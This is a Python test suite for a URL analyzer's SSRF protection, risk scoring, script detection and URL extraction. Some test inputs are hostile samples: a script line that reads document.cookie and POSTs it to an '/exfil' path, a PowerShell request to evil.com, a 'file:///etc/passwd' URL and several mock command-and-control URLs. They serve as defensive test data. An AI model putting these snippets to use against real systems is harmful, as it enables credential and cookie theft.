"""Tests for the URL analyzer (expansion, SSRF protection, categorization)."""

import sys
import os
from unittest.mock import patch, MagicMock, AsyncMock

import pytest
import pytest_asyncio

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from analyzers.url_analyzer import (
    URLAnalyzer,
    is_internal_ip,
    is_safe_url,
    BLOCKED_IP_RANGES,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def analyzer():
    """Provide a fresh URLAnalyzer instance."""
    return URLAnalyzer()


# ===================================================================
# SSRF Protection  --  is_internal_ip()
# ===================================================================

class TestIsInternalIP:
    """Tests for the is_internal_ip helper."""

    def test_loopback_127_0_0_1(self):
        assert is_internal_ip("127.0.0.1") is True

    def test_loopback_127_x(self):
        assert is_internal_ip("127.0.0.2") is True

    def test_private_10_x(self):
        assert is_internal_ip("10.0.0.1") is True
        assert is_internal_ip("10.255.255.255") is True

    def test_private_172_16_x(self):
        assert is_internal_ip("172.16.0.1") is True
        assert is_internal_ip("172.31.255.255") is True

    def test_non_private_172_15(self):
        """172.15.x.x is NOT in the 172.16.0.0/12 private range."""
        assert is_internal_ip("172.15.0.1") is False

    def test_private_192_168_x(self):
        assert is_internal_ip("192.168.0.1") is True
        assert is_internal_ip("192.168.255.255") is True

    def test_link_local_169_254_x(self):
        assert is_internal_ip("169.254.0.1") is True
        assert is_internal_ip("169.254.255.255") is True

    def test_ipv6_localhost(self):
        assert is_internal_ip("::1") is True

    def test_ipv6_private_fc00(self):
        assert is_internal_ip("fc00::1") is True
        assert is_internal_ip("fd12:3456:789a::1") is True

    def test_public_ip_not_internal(self):
        assert is_internal_ip("8.8.8.8") is False
        assert is_internal_ip("1.1.1.1") is False
        assert is_internal_ip("203.0.113.50") is False

    def test_invalid_ip_returns_false(self):
        assert is_internal_ip("not-an-ip") is False
        assert is_internal_ip("") is False


# ===================================================================
# SSRF Protection  --  is_safe_url()
# ===================================================================

class TestIsSafeURL:
    """Tests for is_safe_url (scheme and host validation)."""

    def test_reject_file_scheme(self):
        safe, msg = is_safe_url("file:///etc/passwd")
        assert safe is False
        assert "scheme" in msg.lower() or "Blocked" in msg

    def test_reject_ftp_scheme(self):
        safe, msg = is_safe_url("ftp://internal-server/data")
        assert safe is False

    def test_reject_gopher_scheme(self):
        safe, msg = is_safe_url("gopher://evil:70/")
        assert safe is False

    def test_reject_data_scheme(self):
        safe, msg = is_safe_url("data:text/html,<h1>pwned</h1>")
        assert safe is False

    def test_allow_http_scheme(self):
        """HTTP to a public host should be allowed (DNS resolution may fail in tests)."""
        # We patch gethostbyname to return a public IP so the test is deterministic
        with patch("analyzers.url_analyzer.socket.gethostbyname", return_value="93.184.216.34"):
            safe, _ = is_safe_url("http://example-safe.com/page")
            assert safe is True

    def test_allow_https_scheme(self):
        with patch("analyzers.url_analyzer.socket.gethostbyname", return_value="93.184.216.34"):
            safe, _ = is_safe_url("https://example-safe.com/page")
            assert safe is True

    def test_reject_localhost_hostname(self):
        safe, msg = is_safe_url("http://localhost/admin")
        assert safe is False
        assert "localhost" in msg.lower() or "Blocked" in msg

    def test_reject_127_0_0_1_hostname(self):
        safe, msg = is_safe_url("http://127.0.0.1/admin")
        assert safe is False

    def test_reject_url_resolving_to_internal_ip(self):
        """If DNS resolves to a private IP, the URL should be blocked."""
        with patch("analyzers.url_analyzer.socket.gethostbyname", return_value="10.0.0.5"):
            safe, msg = is_safe_url("http://looks-legit.com/")
            assert safe is False
            assert "internal" in msg.lower() or "Blocked" in msg

    def test_reject_url_resolving_to_loopback(self):
        with patch("analyzers.url_analyzer.socket.gethostbyname", return_value="127.0.0.1"):
            safe, msg = is_safe_url("http://evil-redirect.com/")
            assert safe is False

    def test_unresolvable_hostname_allowed(self):
        """If DNS fails, the URL is allowed (the HTTP request will fail anyway)."""
        import socket
        with patch("analyzers.url_analyzer.socket.gethostbyname", side_effect=socket.gaierror):
            safe, _ = is_safe_url("http://nonexistent-domain.xyz/")
            assert safe is True


# ===================================================================
# URL Shortener Detection
# ===================================================================

class TestURLShortenerDetection:
    """Tests for identifying shortened URLs."""

    def test_bit_ly_detected(self, analyzer):
        from urllib.parse import urlparse
        parsed = urlparse("https://bit.ly/abc123")
        domain = parsed.netloc.lower()
        assert any(s in domain for s in analyzer.SHORTENER_DOMAINS)

    def test_tinyurl_detected(self, analyzer):
        from urllib.parse import urlparse
        parsed = urlparse("https://tinyurl.com/y12345")
        domain = parsed.netloc.lower()
        assert any(s in domain for s in analyzer.SHORTENER_DOMAINS)

    def test_regular_domain_not_shortened(self, analyzer):
        from urllib.parse import urlparse
        parsed = urlparse("https://www.normal-site.com/page")
        domain = parsed.netloc.lower()
        assert not any(s in domain for s in analyzer.SHORTENER_DOMAINS)


# ===================================================================
# URL Expansion (mocked)
# ===================================================================

class TestURLExpansion:
    """Tests for expand_shortened_url with mocked HTTP."""

    @pytest.mark.asyncio
    async def test_expand_shortened_url_success(self, analyzer):
        """Successful expansion should populate expanded_url."""
        mock_response = MagicMock()
        mock_response.json.return_value = {
            "success": True,
            "resolved_url": "https://real-destination.com/page"
        }

        mock_client_instance = AsyncMock()
        mock_client_instance.get.return_value = mock_response
        mock_client_instance.__aenter__ = AsyncMock(return_value=mock_client_instance)
        mock_client_instance.__aexit__ = AsyncMock(return_value=False)

        with patch("httpx.AsyncClient", return_value=mock_client_instance):
            result = await analyzer.expand_shortened_url("https://bit.ly/abc123")
            assert result["expanded_url"] == "https://real-destination.com/page"
            assert result["error"] is None

    @pytest.mark.asyncio
    async def test_expand_shortened_url_failure(self, analyzer):
        """Failed expansion should report the error."""
        mock_response = MagicMock()
        mock_response.json.return_value = {
            "success": False,
            "error": "URL not found"
        }

        mock_client_instance = AsyncMock()
        mock_client_instance.get.return_value = mock_response
        mock_client_instance.__aenter__ = AsyncMock(return_value=mock_client_instance)
        mock_client_instance.__aexit__ = AsyncMock(return_value=False)

        with patch("httpx.AsyncClient", return_value=mock_client_instance):
            result = await analyzer.expand_shortened_url("https://bit.ly/dead")
            assert result["expanded_url"] is None
            assert result["error"] is not None

    @pytest.mark.asyncio
    async def test_expand_shortened_url_exception(self, analyzer):
        """Network exceptions should be caught and reported."""
        mock_client_instance = AsyncMock()
        mock_client_instance.get.side_effect = Exception("Connection refused")
        mock_client_instance.__aenter__ = AsyncMock(return_value=mock_client_instance)
        mock_client_instance.__aexit__ = AsyncMock(return_value=False)

        with patch("httpx.AsyncClient", return_value=mock_client_instance):
            result = await analyzer.expand_shortened_url("https://bit.ly/timeout")
            assert result["error"] is not None
            assert "Connection refused" in result["error"]


# ===================================================================
# URL Risk Assessment / Categorization
# ===================================================================

class TestURLCategorization:
    """Tests for assess_url_risk categorization."""

    def test_suspicious_tld_flagged(self, analyzer):
        result = analyzer.assess_url_risk("https://malware.tk/payload.exe")
        assert result["risk_score"] > 0
        assert any("TLD" in ind for ind in result["risk_indicators"])

    def test_ip_as_hostname_flagged(self, analyzer):
        result = analyzer.assess_url_risk("http://203.0.113.5/gate.php")
        assert any("IP address" in ind for ind in result["risk_indicators"])
        assert result["risk_score"] >= 30

    def test_dangerous_extension_flagged(self, analyzer):
        result = analyzer.assess_url_risk("https://legit-looking.com/update.exe")
        assert any("extension" in ind.lower() for ind in result["risk_indicators"])

    def test_url_shortener_flagged(self, analyzer):
        result = analyzer.assess_url_risk("https://bit.ly/suspicious")
        assert any("shortener" in ind.lower() for ind in result["risk_indicators"])

    def test_suspicious_path_flagged(self, analyzer):
        result = analyzer.assess_url_risk("https://phishing.com/security/invoice/download")
        indicators_lower = [i.lower() for i in result["risk_indicators"]]
        assert any("suspicious path" in i for i in indicators_lower)

    def test_long_url_flagged(self, analyzer):
        long_path = "a" * 200
        result = analyzer.assess_url_risk(f"https://phishing.com/{long_path}")
        assert any("long" in ind.lower() for ind in result["risk_indicators"])

    def test_at_symbol_flagged(self, analyzer):
        result = analyzer.assess_url_risk("https://legit.com@evil.com/phish")
        assert any("@" in ind for ind in result["risk_indicators"])
        assert result["risk_score"] >= 40

    def test_many_subdomains_flagged(self, analyzer):
        result = analyzer.assess_url_risk("https://a.b.c.d.e.evil.com/phish")
        assert any("subdomain" in ind.lower() for ind in result["risk_indicators"])

    def test_benign_url_minimal_risk(self, analyzer):
        result = analyzer.assess_url_risk("https://www.normal-company.com/about")
        assert result["risk_level"] == "minimal"
        assert result["risk_score"] == 0

    def test_high_risk_combined(self, analyzer):
        """A URL combining many risk factors should be rated high."""
        result = analyzer.assess_url_risk("https://203.0.113.5@bit.ly/security/update.exe")
        assert result["risk_level"] in ("high", "medium")
        assert result["risk_score"] >= 40

    def test_risk_levels_mapping(self, analyzer):
        """Verify the risk level thresholds."""
        # Minimal: score < 20
        r = analyzer.assess_url_risk("https://safe.com/page")
        assert r["risk_level"] == "minimal"


# ===================================================================
# Content Type / Script Detection
# ===================================================================

class TestContentTypeDetection:
    """Tests for script detection based on file extension and content."""

    def test_script_extension_ps1(self, analyzer):
        assert ".ps1" in analyzer.SCRIPT_EXTENSIONS
        assert analyzer.SCRIPT_EXTENSIONS[".ps1"] == "powershell"

    def test_script_extension_js(self, analyzer):
        assert ".js" in analyzer.SCRIPT_EXTENSIONS
        assert analyzer.SCRIPT_EXTENSIONS[".js"] == "javascript"

    def test_script_extension_vbs(self, analyzer):
        assert ".vbs" in analyzer.SCRIPT_EXTENSIONS
        assert analyzer.SCRIPT_EXTENSIONS[".vbs"] == "vbscript"

    def test_script_extension_bat(self, analyzer):
        assert ".bat" in analyzer.SCRIPT_EXTENSIONS
        assert analyzer.SCRIPT_EXTENSIONS[".bat"] == "batch"

    def test_script_extension_py(self, analyzer):
        assert ".py" in analyzer.SCRIPT_EXTENSIONS
        assert analyzer.SCRIPT_EXTENSIONS[".py"] == "python"

    def test_script_extension_sh(self, analyzer):
        assert ".sh" in analyzer.SCRIPT_EXTENSIONS
        assert analyzer.SCRIPT_EXTENSIONS[".sh"] == "bash"

    def test_looks_like_powershell_script(self, analyzer):
        content = '$x = Invoke-WebRequest -Uri "http://evil.com"'
        assert analyzer._looks_like_script(content) is True

    def test_looks_like_javascript_script(self, analyzer):
        content = 'var data = document.cookie; fetch("/exfil", {method: "POST"});'
        assert analyzer._looks_like_script(content) is True

    def test_looks_like_batch_script(self, analyzer):
        content = "@echo off\nset PATH=%PATH%;C:\\tools"
        assert analyzer._looks_like_script(content) is True

    def test_looks_like_python_script(self, analyzer):
        content = "import os\ndef main():\n    pass"
        assert analyzer._looks_like_script(content) is True

    def test_plain_text_not_script(self, analyzer):
        content = "This is just a plain English sentence."
        assert analyzer._looks_like_script(content) is False

    def test_detect_script_type_powershell(self, analyzer):
        assert analyzer._detect_script_type("Invoke-Expression $cmd") == "powershell"

    def test_detect_script_type_vbscript(self, analyzer):
        assert analyzer._detect_script_type("WScript.Echo 'hi'") == "vbscript"

    def test_detect_script_type_javascript(self, analyzer):
        assert analyzer._detect_script_type("document.getElementById('x')") == "javascript"

    def test_detect_script_type_batch(self, analyzer):
        assert analyzer._detect_script_type("@echo off\ngoto start") == "batch"

    def test_detect_script_type_python(self, analyzer):
        assert analyzer._detect_script_type("import sys\ndef run():") == "python"

    def test_detect_script_type_bash(self, analyzer):
        assert analyzer._detect_script_type("#!/bin/bash\necho hi") == "bash"

    def test_detect_script_type_unknown(self, analyzer):
        assert analyzer._detect_script_type("random noise 123") == "unknown"


# ===================================================================
# URL Text Extraction
# ===================================================================

class TestExtractURLsFromText:
    """Tests for extract_urls_from_text."""

    def test_extract_http_urls(self, analyzer):
        text = "Visit http://malware.xyz/payload for details"
        urls = analyzer.extract_urls_from_text(text)
        assert any("http://malware.xyz/payload" in u for u in urls)

    def test_extract_https_urls(self, analyzer):
        text = "Callback to https://c2.evil.tk/gate.php"
        urls = analyzer.extract_urls_from_text(text)
        assert any("https://c2.evil.tk/gate.php" in u for u in urls)

    def test_extract_defanged_urls(self, analyzer):
        text = "Defanged: hxxps://bad[.]site[.]com/malware"
        urls = analyzer.extract_urls_from_text(text)
        assert any("https://bad.site.com/malware" in u for u in urls)

    def test_dedup_urls(self, analyzer):
        text = "http://repeat.xyz/a http://repeat.xyz/a"
        urls = analyzer.extract_urls_from_text(text)
        assert urls.count("http://repeat.xyz/a") == 1

    def test_short_urls_filtered(self, analyzer):
        text = "http://x.c"
        urls = analyzer.extract_urls_from_text(text)
        # 10 chars or fewer should be excluded
        assert len(urls) == 0


# ===================================================================
# Full analyze() method (mocked HTTP)
# ===================================================================

class TestAnalyzeMethod:
    """Tests for the full async analyze() method with mocked HTTP."""

    @pytest.mark.asyncio
    async def test_analyze_blocked_internal_url(self, analyzer):
        """URLs pointing to internal IPs should be blocked."""
        result = await analyzer.analyze("http://127.0.0.1/admin")
        assert len(result["errors"]) > 0
        assert any("SSRF" in e or "Blocked" in e for e in result["errors"])

    @pytest.mark.asyncio
    async def test_analyze_blocked_file_scheme(self, analyzer):
        """file:// scheme should be blocked."""
        result = await analyzer.analyze("file:///etc/passwd")
        assert len(result["errors"]) > 0

    @pytest.mark.asyncio
    async def test_analyze_blocked_private_ip(self, analyzer):
        """Direct private IP URLs should be blocked."""
        with patch("analyzers.url_analyzer.socket.gethostbyname", return_value="10.0.0.1"):
            result = await analyzer.analyze("http://10.0.0.1/secret")
            assert len(result["errors"]) > 0

    @pytest.mark.asyncio
    async def test_analyze_returns_expected_structure(self, analyzer):
        """Even on blocked URLs, the result should have all expected keys."""
        result = await analyzer.analyze("http://localhost/")
        assert "original_url" in result
        assert "effective_url" in result
        assert "redirect_chain" in result
        assert "is_shortened" in result
        assert "domain_info" in result
        assert "errors" in result
